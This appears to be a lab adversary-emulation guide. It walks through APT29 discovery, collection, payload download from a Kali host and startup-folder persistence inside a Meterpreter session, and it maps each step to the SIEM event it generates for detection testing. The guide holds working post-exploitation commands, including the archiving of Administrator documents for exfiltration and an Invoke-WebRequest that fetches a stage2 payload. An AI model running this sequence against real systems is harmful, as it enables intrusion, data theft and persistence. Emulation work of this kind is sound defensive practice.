# APT29 — TTPs Execution Guide

> Step-by-step execution guide for APT29 TTPs in the active Meterpreter session.
> Follow this sequence after the payload has successfully established the C2.
> Each step documents the command to execute, what happens on the system and the event generated in the SIEM.

---

## Precondition

Before starting confirm you have an active Meterpreter session:

```
meterpreter > getuid
Server username: LAB\Administrator

meterpreter > sysinfo
Computer: WIN-DC01
OS: Windows 2022 (10.0 Build 20348)
Domain: LAB
```

If the session is not active go back to the [README](README-en.md) and run `auto-lnk.sh` first.

---

## Phase 3 — Discovery

### Step 1 — T1087 — Account Discovery

Open a shell on the compromised system and enumerate domain users.

```
meterpreter > shell
Process 1234 created.
Channel 1 created.

C:\Windows\system32> net user
C:\Windows\system32> net user /domain
```

Expected result:
```
User accounts for \\WIN-DC01

Administrator    madAdmin    m.torres
r.anderson       s.connor    svc.backup
```

Event generated in SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\net.exe
CommandLine: net user /domain
```

---

### Step 2 — T1069 — Permission Groups Discovery

Enumerate privileged domain groups to identify escalation targets.

```
C:\Windows\system32> net group "Domain Admins" /domain
C:\Windows\system32> net group "Enterprise Admins" /domain
```

Expected result:
```
Group name     Domain Admins
Members        Administrator  madAdmin
```

Event generated in SIEM:
```
EventID: 4688
CommandLine: net group "Domain Admins" /domain
```

---

### Step 3 — T1082 — System Information Discovery

Collect detailed system information to map the environment.

```
C:\Windows\system32> systeminfo
```

Expected result:
```
OS Name:       Microsoft Windows Server 2022
Domain:        lab.local
Logon Server:  \\WIN-DC01
```

Event generated in SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\systeminfo.exe
```

---

### Step 4 — T1057 — Process Discovery

Enumerate running processes to identify security tools and other targets.

```
C:\Windows\system32> tasklist
C:\Windows\system32> tasklist /v
```

Event generated in SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\tasklist.exe
```

---

### Step 5 — T1012 — Registry Query

Query the Windows registry to collect system configurations and identify installed software.

```
C:\Windows\system32> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
C:\Windows\system32> reg query HKLM\SYSTEM\CurrentControlSet\Services
```

Event generated in SIEM:
```
EventID: 4688
NewProcessName: C:\Windows\System32\reg.exe
CommandLine: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
```

---

## Phase 4 — Collection and Persistence

### Step 6 — T1560 — Archive Collected Data

Compress the Administrator documents to prepare for exfiltration. Note that 7-Zip is not in the system PATH and requires the full path.

```
C:\Windows\system32> "C:\Program Files\7-Zip\7z.exe" a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
```

Expected result:
```
7-Zip 22.01
Creating archive: C:\Users\Public\data.zip
Add new data to archive: 1 file, 0 bytes
```

Event generated in SIEM:
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Program Files\7-Zip\7z.exe
CommandLine: 7z a -tzip C:\Users\Public\data.zip ...

EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Public\data.zip
```

---

### Step 7 — T1105 — Ingress Tool Transfer

Download an additional file from the Kali HTTP server to simulate tool transfer to the compromised system. Run inside PowerShell.

```
C:\Windows\system32> powershell.exe

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://192.168.10.102:8080/ds7002.zip" -OutFile "C:\Users\Public\stage2.zip"
```

Confirm the HTTP server is running on Kali before this step:
```bash
# On Kali — separate terminal
cd ~/adversary_emulation_library/apt29/Emulation_Plan/Scenario_1/lab_4.3/
python3 -m http.server 8080
```

Event generated in SIEM:
```
EventID: 4104 (PowerShell Script Block Logging)
ScriptBlockText: Invoke-WebRequest -Uri http://192.168.10.102:8080/ds7002.zip

EventID: 3 (Sysmon NetworkConnect)
DestinationPort: 8080
Image: powershell.exe
```

---

### Step 8 — T1547.009 — Startup Folder Persistence

Install persistence by copying the LNK payload to the user Startup folder. The payload will execute automatically on the next login.

The LNK file is inside the ZIP downloaded during the Initial Access phase. Extract first then copy to the Startup folder.

```
PS C:\Windows\system32> Expand-Archive -Path "C:\Users\Administrator\Downloads\ds7002.zip" -DestinationPath "C:\Users\Administrator\Downloads\ds7002\" -Force

PS C:\Windows\system32> Copy-Item "C:\Users\Administrator\Downloads\ds7002\ds7002.lnk" "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

Confirm the file was copied:
```
PS C:\Windows\system32> dir "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

Expected result:
```
Mode    LastWriteTime   Name
----    -------------   ----
-a----  13/05/2026      ds7002.lnk
```

Event generated in SIEM:
```
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\
                Start Menu\Programs\Startup\ds7002.lnk
```

---

## Verify Detection in the SIEM

After executing all TTPs check the alerts in Kibana:

```
http://192.168.10.20:5601
Security -> Alerts
```

You should see alerts for all executed TTPs. To deploy the detection rules before running the attack check:

```
../04-detection/README.md
```

To view the complete attack timeline with real evidence:

```
../02-attack-phases/attack-timeline-en.md
```

---

## References

- [MAD20 APT29 Emulation Plan — Lab 4.3](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29)
- [MITRE ATT&CK — APT29](https://attack.mitre.org/groups/G0016/)
